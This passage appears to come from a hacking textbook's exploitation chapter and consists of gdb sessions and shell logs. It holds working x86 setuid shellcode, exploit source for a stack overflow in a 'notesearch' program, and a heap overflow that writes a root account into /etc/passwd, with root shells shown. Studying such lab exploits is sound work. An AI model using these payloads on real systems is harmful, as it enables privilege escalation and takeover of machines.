0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a036:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a046:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a056:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a066:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a076:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a086:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a096:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a0a6:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n(gdb) x/s command\n0x804a008:       \"./notesearch\n'¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶û\nÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿\"\n(gdb)\n```", "```\n(gdb) cont\nContinuing.\n\nBreakpoint 2, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:27\n27         memcpy(buffer+60, shellcode, sizeof(shellcode)-1); \n(gdb) x/40x buffer\n0x804a016:      0x90909090      0x90909090      0x90909090      0x90909090\n0x804a026:      0x90909090      0x90909090      0x90909090      0x90909090\n0x804a036:      0x90909090      0x90909090      0x90909090      0x90909090\n0x804a046:      0x90909090      0x90909090      0x90909090      0xbffff6f6\n0x804a056:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a066:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a076:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a086:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a096:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a0a6:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n(gdb) x/s command \n0x804a008:       \"./notesearch '\", '\\220' <repeats 60 times>, \"¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿\n¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿\"\n(gdb)\n```", "```\n(gdb) cont\nContinuing.\n\nBreakpoint 3, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:29\n29         strcat(command, \"\\'\");\n(gdb) x/40x buffer\n0x804a016:      0x90909090      0x90909090      0x90909090      0x90909090\n0x804a026:      0x90909090      0x90909090      0x90909090      0x90909090\n0x804a036:      0x90909090      0x90909090      0x90909090      0x90909090\n0x804a046:      0x90909090      0x90909090      0x90909090      0x3158466a\n0x804a056:      0xcdc931db      0x2f685180      0x6868732f      0x6e69622f\n0x804a066:      0x5351e389      0xb099e189      0xbf80cd0b      0xbffff6f6\n0x804a076:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a086:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a096:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a0a6:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n(gdb) x/s command\n0x804a008:       \"./notesearch '\", '\\220' <repeats 60 times>, \"1À1Û1É\\231°gÍ\\200j\\vXQh//shh/\nbin\\211ãQ\\211âS\\211áÍ\\200¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿\"\n(gdb)\n```", "```\n  unsigned int i, *ptr, ret, offset=270;\n  char *command, *buffer;\n\n  command = (char *) malloc(200);\n  bzero(command, 200); // Zero out the new memory.\n\n  strcpy(command, \"./notesearch \\'\"); // Start command buffer.\n  buffer = command + strlen(command); // Set buffer at the end.\n\n  if(argc > 1) // Set offset.\n    offset = atoi(argv[1]);\n\n  ret = (unsigned int) &i - offset; // Set return address.\n```", "```\nreader@hacking:~/booksrc $ gcc exploit_notesearch.c\nreader@hacking:~/booksrc $ ./a.out 100\n-------[ end of note data ]-------\nreader@hacking:~/booksrc $ ./a.out 200\n-------[ end of note data ]-------\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ seq 1 10\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\nreader@hacking:~/booksrc $ seq 1 3 10\n1\n4\n7\n10\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ for i in $(seq 1 3 10)\n> do\n> echo The value is $i\n> done\nThe value is 1\nThe value is 4\nThe value is 7\nThe value is 10\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ for i in $(seq 0 30 300)\n> do\n> echo Trying offset $i\n> ./a.out $i\n> done\nTrying offset 0\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n```", "```\nreader@hacking:~/booksrc $ export MYVAR=test\nreader@hacking:~/booksrc $ echo $MYVAR\ntest\nreader@hacking:~/booksrc $ env\nSSH_AGENT_PID=7531\nSHELL=/bin/bash\nDESKTOP_STARTUP_ID=\nTERM=xterm\nGTK_RC_FILES=/etc/gtk/gtkrc:/home/reader/.gtkrc-1.2-gnome2\nWINDOWID=39845969\nOLDPWD=/home/reader\nUSER=reader\nLS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;\n01:or=4\n0;31;01:su=37;41:sg=30;43:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:\n*.arj=01;\n31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:\n*.deb=01;31:*\n.rpm=01;31:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:\n*.pgm=01;35\n:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:\n*.mov=01;\n35:*.mpg=01;35:*.mpeg=01;35:*.avi=01;35:*.fli=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:\n*.xwd=01;\n35:*.flac=01;35:*.mp3=01;35:*.mpc=01;35:*.ogg=01;35:*.wav=01;35:\nSSH_AUTH_SOCK=/tmp/ssh-EpSEbS7489/agent.7489\nGNOME_KEYRING_SOCKET=/tmp/keyring-AyzuEi/socket\nSESSION_MANAGER=local/hacking:/tmp/.ICE-unix/7489\nUSERNAME=reader\nDESKTOP_SESSION=default.desktop\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\nGDM_XSERVER_LOCATION=local\nPWD=/home/reader/booksrc\nLANG=en_US.UTF-8\nGDMSESSION=default.desktop\nHISTCONTROL=ignoreboth\nHOME=/home/reader\nSHLVL=1\nGNOME_DESKTOP_SESSION_ID=Default\nLOGNAME=reader\nDBUS_SESSION_BUS_ADDRESS=unix:abstract=/tmp/dbus-\nDxW6W1OH1O,guid=4f4e0e9cc6f68009a059740046e28e35\nLESSOPEN=| /usr/bin/lesspipe %s\nDISPLAY=:0.0\n`MYVAR=test`\nLESSCLOSE=/usr/bin/lesspipe %s %s\nRUNNING_UNDER_GDM=yes\nCOLORTERM=gnome-terminal\nXAUTHORITY=/home/reader/.Xauthority\n_=/usr/bin/env\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ head exploit_notesearch.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar shellcode[]=\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n\"\\xe1\\xcd\\x80\";\n\nint main(int argc, char *argv[]) {\n   unsigned int i, *ptr, ret, offset=270;\nreader@hacking:~/booksrc $ head exploit_notesearch.c | grep \"^\\\"\"\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n\"\\xe1\\xcd\\x80\";\nreader@hacking:~/booksrc $ head exploit_notesearch.c | grep \"^\\\"\" | cut -d\\\" -f2\n\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\n\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\n\\xe1\\xcd\\x80\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ for i in $(head exploit_notesearch.c | grep \"^\\\"\" | cut -d\\\"\n -f2)\n\n> do\n> echo -en $i\n> done > shellcode.bin\nreader@hacking:~/booksrc $ hexdump -C shellcode.bin \n00000000  31 c0 31 db 31 c9 99 b0  a4 cd 80 6a 0b 58 51 68  |1.1.1......j.XQh|\n00000010  2f 2f 73 68 68 2f 62 69  6e 89 e3 51 89 e2 53 89  |//shh/bin..Q..S.|\n00000020  e1 cd 80                                          |...|\n00000023 \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ export SHELLCODE=$(perl -e 'print \"\\x90\"x200')$(cat\n shellcode.bin)\nreader@hacking:~/booksrc $ echo $SHELLCODE\n␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣\n␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣\n␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣1␣1␣1␣␣␣ j\n                                     XQh//shh/bin␣␣Q␣␣S␣␣\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gdb -q ./notesearch\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) break main\nBreakpoint 1 at 0x804873c\n(gdb) run\nStarting program: /home/reader/booksrc/notesearch\n\nBreakpoint 1, 0x0804873c in main ()\n(gdb)\n```", "```\n(gdb) i r esp\nesp            0xbffff660      0xbffff660\n(gdb) x/24s $esp + 0x240\n0xbffff8a0:      \"\"\n0xbffff8a1:      \"\"\n0xbffff8a2:      \"\"\n0xbffff8a3:      \"\"\n0xbffff8a4:      \"\"\n0xbffff8a5:      \"\"\n0xbffff8a6:      \"\"\n0xbffff8a7:      \"\"\n0xbffff8a8:      \"\"\n0xbffff8a9:      \"\"\n0xbffff8aa:      \"\"\n0xbffff8ab:      \"i686\"\n0xbffff8b0:      \"/home/reader/booksrc/notesearch\"\n0xbffff8d0:      \"SSH_AGENT_PID=7531\"\n`0xbffffd56:      \"SHELLCODE=\", '\\220' <repeats 190 times>...`\n0xbffff9ab:      \"\\220\\220\\220\\220\\220\\220\\220\\220\\220\\2201ï¿½1ï¿½1ï¿½\\231ï¿½ï¿½ï¿½\\200j\\vXQh//\nshh/bin\\211ï¿½Q\\211ï¿½S\\211ï¿½ï¿½\\200\"\n0xbffff9d9:      \"TERM=xterm\"\n0xbffff9e4:      \"DESKTOP_STARTUP_ID=\"\n0xbffff9f8:      \"SHELL=/bin/bash\"\n0xbffffa08:      \"GTK_RC_FILES=/etc/gtk/gtkrc:/home/reader/.gtkrc-1.2-gnome2\"\n0xbffffa43:      \"WINDOWID=39845969\"\n0xbffffa55:      \"USER=reader\"\n0xbffffa61:\n\"LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;\n33;01:or=\n40;31;01:su=37;41:sg=30;43:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:\n*.arj=01\n;31:*.taz=0\"...\n0xbffffb29:\n\"1;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:\n*.rpm=01;3\n1:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:\n*.ppm=01\n;35:*.tga=0\"...\n(gdb) x/s 0xbffff8e3\n0xbffff8e3:      \"SHELLCODE=\", '\\220' <repeats 190 times>...\n(gdb) x/s 0xbffff8e3 + 100\n0xbffff947:      '\\220' <repeats 110 times>, \"1ï¿½1ï¿½1ï¿½\\231ï¿½ï¿½ï¿½\\200j\\vXQh//shh/bin\\\n211ï¿½Q\\211ï¿½S\\211ï¿½ï¿½\\200\"\n(gdb)\n```", "```\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\x47\\xf9\\xff\\xbf\"x40')\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n-------[ end of note data ]-------\nsh-3.2# whoami\nroot \nsh-3.2#\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n\nint main(int argc, char *argv[]) {\n   printf(\"%s is at %p\\n\", argv[1], getenv(argv[1]));\n}\n```", "```\nreader@hacking:~/booksrc $ gcc getenv_example.c\nreader@hacking:~/booksrc $ ./a.out SHELLCODE\nSHELLCODE is at 0xbffff90b\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\x0b\\xf9\\xff\\xbf\"x40')\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n-------[ end of note data ]------- \nsh-3.2#\n```", "```\nreader@hacking:~/booksrc $ export SLEDLESS=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./a.out SLEDLESS\nSLEDLESS is at 0xbfffff46\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\x46\\xff\\xff\\xbf\"x40')\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n-------[ end of note data ]-------\nSegmentation fault\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ cp a.out a\nreader@hacking:~/booksrc $ ./a SLEDLESS\nSLEDLESS is at 0xbfffff4e\nreader@hacking:~/booksrc $ cp a.out bb\nreader@hacking:~/booksrc $ ./bb SLEDLESS\nSLEDLESS is at 0xbfffff4c\nreader@hacking:~/booksrc $ cp a.out ccc\nreader@hacking:~/booksrc $ ./ccc SLEDLESS\nSLEDLESS is at 0xbfffff4a\nreader@hacking:~/booksrc $ ./a.out SLEDLESS\nSLEDLESS is at 0xbfffff46\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 0xbfffff4e - 0xbfffff46\n$1 = 8\n(gdb) quit\nreader@hacking:~/booksrc $\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main(int argc, char *argv[]) {\n   char *ptr;\n\n   if(argc < 3) {\n      printf(\"Usage: %s <environment var> <target program name>\\n\", argv[0]);\n      exit(0);\n   }\n   ptr = getenv(argv[1]); /* Get env var location. */\n   ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */\n   printf(\"%s will be at %p\\n\", argv[1], ptr);\n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o getenvaddr getenvaddr.c\nreader@hacking:~/booksrc $ ./getenvaddr SLEDLESS ./notesearch\nSLEDLESS will be at 0xbfffff3c\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\x3c\\xff\\xff\\xbf\"x40')\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n```", "```\nint system(const char * cmd)\n{\n        int ret, pid, waitstat;\n        void (*sigint) (), (*sigquit) ();\n\n        `if ((pid = fork()) == 0) {                 execl(\"/bin/sh\", \"sh\", \"-c\", cmd, NULL);                 exit(127);         }`\n        if (pid < 0) return(127 << 8);\n        sigint = signal(SIGINT, SIG_IGN);\n        sigquit = signal(SIGQUIT, SIG_IGN);\n        while ((waitstat = wait(&ret)) != pid && waitstat != -1);\n        if (waitstat == -1) ret = -1;\n        signal(SIGINT, sigint);\n        signal(SIGQUIT, sigquit);\n        return(ret);\n}\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\nchar shellcode[]=\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n\"\\xe1\\xcd\\x80\";\n\nint main(int argc, char *argv[]) {\n   char *env[2] = {shellcode, 0};\n   unsigned int i, ret;\n\n   char *buffer = (char *) malloc(160);\n\n   ret = 0xbffffffa - (sizeof(shellcode)-1) - strlen(\"./notesearch\");\n   for(i=0; i < 160; i+=4)\n      *((unsigned int *)(buffer+i)) = ret;\n\n   execle(\"./notesearch\", \"notesearch\", buffer, 0, env);\n   free(buffer);\n}\n```", "```\nreader@hacking:~/booksrc $ gcc exploit_notesearch_env.c\nreader@hacking:~/booksrc $ ./a.out\n-------[ end of note data ]------- \nsh-3.2#\n```", "```\n   buffer = (char *) ec_malloc(100);\n   datafile = (char *) ec_malloc(20);\n   strcpy(datafile, \"/var/notes\");\n\n   if(argc < 2)                // If there aren't command-line arguments,\n      usage(argv[0], datafile); // display usage message and exit.\n\n   `strcpy(buffer, argv[1]);  // Copy into buffer.`\n\n   printf(\"[DEBUG] buffer   @ %p: \\'%s\\'\\n\", buffer, buffer);\n   printf(\"[DEBUG] datafile @ %p: \\'%s\\'\\n\", datafile, datafile);\n```", "```\nreader@hacking:~/booksrc $ ./notetaker test\n[DEBUG] buffer   @ 0x804a008: 'test'\n[DEBUG] datafile @ 0x804a070: '/var/notes'\n[DEBUG] file descriptor is 3\nNote has been saved.\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 0x804a070 - 0x804a008\n$1 = 104\n(gdb) quit\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./notetaker $(perl -e 'print \"A\"x104')\n[DEBUG] buffer   @ 0x804a008: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n[DEBUG] datafile @ 0x804a070: ''\n[!!] Fatal Error in main() while opening file: No such file or directory\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./notetaker $(perl -e 'print \"A\"x104 . \"testfile\"')\n[DEBUG] buffer   @ 0x804a008: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAA \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtestfile'\n[DEBUG] datafile @ 0x804a070: 'testfile'\n[DEBUG] file descriptor is 3\nNote has been saved.\n*** glibc detected *** ./notetaker: free(): invalid next size (normal): 0x0804a008 ***\n======= Backtrace: =========\n/lib/tls/i686/cmov/libc.so.6[0xb7f017cd]\n/lib/tls/i686/cmov/libc.so.6(cfree+0x90)[0xb7f04e30]\n./notetaker[0x8048916]\n/lib/tls/i686/cmov/libc.so.6(__libc_start_main+0xdc)[0xb7eafebc]\n./notetaker[0x8048511]\n======= Memory map: ========\n08048000-08049000 r-xp 00000000 00:0f 44384      /cow/home/reader/booksrc/notetaker\n08049000-0804a000 rw-p 00000000 00:0f 44384      /cow/home/reader/booksrc/notetaker\n0804a000-0806b000 rw-p 0804a000 00:00 0          [heap]\nb7d00000-b7d21000 rw-p b7d00000 00:00 0\nb7d21000-b7e00000 ---p b7d21000 00:00 0\nb7e83000-b7e8e000 r-xp 00000000 07:00 15444      /rofs/lib/libgcc_s.so.1\nb7e8e000-b7e8f000 rw-p 0000a000 07:00 15444      /rofs/lib/libgcc_s.so.1\n\nb7e99000-b7e9a000 rw-p b7e99000 00:00 0\nb7e9a000-b7fd5000 r-xp 00000000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fd5000-b7fd6000 r--p 0013b000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fd6000-b7fd8000 rw-p 0013c000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fd8000-b7fdb000 rw-p b7fd8000 00:00 0\nb7fe4000-b7fe7000 rw-p b7fe4000 00:00 0\nb7fe7000-b8000000 r-xp 00000000 07:00 15421      /rofs/lib/ld-2.5.so\nb8000000-b8002000 rw-p 00019000 07:00 15421      /rofs/lib/ld-2.5.so\nbffeb000-c0000000 rw-p bffeb000 00:00 0          [stack]\nffffe000-fffff000 r-xp 00000000 00:00 0          [vdso]\nAborted\nreader@hack ing:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ grep -B10 free notetaker.c\n\n   if(write(fd, buffer, strlen(buffer)) == -1) // Write note.\n      fatal(\"in main() while writing buffer to file\");\n   write(fd, \"\\n\", 1); // Terminate line.\n\n// Closing file\n   if(close(fd) == -1)\n      fatal(\"in main() while closing file\");\n\n   printf(\"Note has been saved.\\n\");\n   free(buffer);\n   free(datafile);\nreader@hacking:~/booksrc $ ls -l ./testfile\n-rw------- 1 root reader 118 2007-09-09 16:19 ./testfile\nreader@hacking:~/booksrc $ cat ./testfile\ncat: ./testfile: Permission denied\nreader@hacking:~/booksrc $ sudo cat ./testfile\n?\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAA\nAAAAAAAAAtestfile\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ cp /etc/passwd /tmp/passwd.bkup\nreader@hacking:~/booksrc $ head /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ perl -e 'print crypt(\"password\", \"AA\"). \"\\n\"'\nAA6tQYSfGxd/A\nreader@hacking:~/booksrc $ perl -e 'print crypt(\"password\", \"XX\"). \"\\n\"'\nXXq2wKiyI43A2\nreader@hacking:~/booksrc $\n```", "```\nmyroot:XXq2wKiyI43A2:0:0:me:/root:/bin/bash\n```", "```\nreader@hacking:~/booksrc $ mkdir /tmp/etc\nreader@hacking:~/booksrc $ ln -s /bin/bash /tmp/etc/passwd\nreader@hacking:~/booksrc $ ls -l /tmp/etc/passwd\nlrwxrwxrwx 1 reader reader 9 2007-09-09 16:25 /tmp/etc/passwd -> /bin/bash\nreader@hacking:~/booksrc $\n```", "```\nmyroot:XXq2wKiyI43A2:0:0:me:/root:/tmp/etc/passwd\n```", "```\nreader@hacking:~/booksrc $ perl -e 'print \"myroot:XXq2wKiyI43A2:0:0:me:/root:/tmp\"' | wc\n -c\n38\nreader@hacking:~/booksrc $ perl -e 'print \"myroot:XXq2wKiyI43A2:0:0:\" . \"A\"x50 .\n \":/root:/tmp\"'\n| wc -c\n86\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 104 - 86 + 50\n$1 = 68\n(gdb) quit\nreader@hacking:~/booksrc $ `perl -e 'print \"myroot:XXq2wKiyI43A2:0:0:\" . \"A\"x68 .  \":/root:/tmp\"'`\n| wc -c\n104\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./notetaker $(perl -e 'print \"myroot:XXq2wKiyI43A2:0:0:\"\n . \"A\"x68 .\n\":/root:/tmp/etc/passwd\"')\n[DEBUG] buffer   @ 0x804a008: 'myroot:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd'\n[DEBUG] datafile @ 0x804a070: '/etc/passwd'\n[DEBUG] file descriptor is 3\nNote has been saved.\n*** glibc detected *** ./notetaker: free(): invalid next size (normal): 0x0804a008 ***\n======= Backtrace: =========\n/lib/tls/i686/cmov/libc.so.6[0xb7f017cd]\n/lib/tls/i686/cmov/libc.so.6(cfree+0x90)[0xb7f04e30]\n./notetaker[0x8048916]\n/lib/tls/i686/cmov/libc.so.6(__libc_start_main+0xdc)[0xb7eafebc]\n./notetaker[0x8048511]\n======= Memory map: ========\n08048000-08049000 r-xp 00000000 00:0f 44384      /cow/home/reader/booksrc/notetaker\n08049000-0804a000 rw-p 00000000 00:0f 44384      /cow/home/reader/booksrc/notetaker\n0804a000-0806b000 rw-p 0804a000 00:00 0          [heap]\nb7d00000-b7d21000 rw-p b7d00000 00:00 0\nb7d21000-b7e00000 ---p b7d21000 00:00 0\nb7e83000-b7e8e000 r-xp 00000000 07:00 15444      /rofs/lib/libgcc_s.so.1\nb7e8e000-b7e8f000 rw-p 0000a000 07:00 15444      /rofs/lib/libgcc_s.so.1\nb7e99000-b7e9a000 rw-p b7e99000 00:00 0\nb7e9a000-b7fd5000 r-xp 00000000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fd5000-b7fd6000 r--p 0013b000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fd6000-b7fd8000 rw-p 0013c000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fd8000-b7fdb000 rw-p b7fd8000 00:00 0\nb7fe4000-b7fe7000 rw-p b7fe4000 00:00 0\nb7fe7000-b8000000 r-xp 00000000 07:00 15421      /rofs/lib/ld-2.5.so\nb8000000-b8002000 rw-p 00019000 07:00 15421      /rofs/lib/ld-2.5.so\nbffeb000-c0000000 rw-p bffeb000 00:00 0          [stack]\nffffe000-fffff000 r-xp 00000000 00:00 0          [vdso]\nAborted\nreader@hacking:~/booksrc $ tail /etc/passwd\navahi:x:105:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false\ncupsys:x:106:113::/home/cupsys:/bin/false\nhaldaemon:x:107:114:Hardware abstraction layer,,,:/home/haldaemon:/bin/false\nhplip:x:108:7:HPLIP system user,,,:/var/run/hplip:/bin/false\ngdm:x:109:118:Gnome Display Manager:/var/lib/gdm:/bin/false\nmatrix:x:500:500:User Acct:/home/matrix:/bin/bash\njose:x:501:501:Jose Ronnick:/home/jose:/bin/bash\nreader:x:999:999:Hacker,,,:/home/reader:/bin/bash\n?\nmyroot:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAA:/\nroot:/tmp/etc/passwd\nreader@hacking:~/booksrc $ su myroot\nPassword:\nroot@hacking:/home/reader/booksrc# whoami\nroot\nroot@hacking:/home/reader/booksrc#\n```", "```\n// Custom user struct to store information about users\nstruct user {\n  int uid;\n  int credits;\n  int highscore;\n  char name[100];\n  int (*current_game) ();\n};\n\n...\n\n// Global variables \nstruct user player;      // Player struct\n```", "```\n// This function is used to input the player name, since \n// scanf(\"%s\", &whatever) will stop input at the first space.\nvoid input_name() {\n   char *name_ptr, input_char='\\n';\n   while(input_char == '\\n')     // Flush any leftover \n      scanf(\"%c\", &input_char);  // newline chars.\n\n   name_ptr = (char *) &(player.name); // name_ptr = player name's address\n   while(input_char != '\\n') {  // Loop until newline.\n      *name_ptr = input_char;   // Put the input char into name field.\n      scanf(\"%c\", &input_char); // Get the next char.\n      name_ptr++;               // Increment the name pointer.\n   }\n   *name_ptr = 0;  // Terminate the string. \n}\n```", "```\n\tif((choice < 1) || (choice > 7))\n\t   printf(\"\\n[!!] The number %d is an invalid selection.\\n\\n\", choice);\n\telse if (choice < 4) {  // 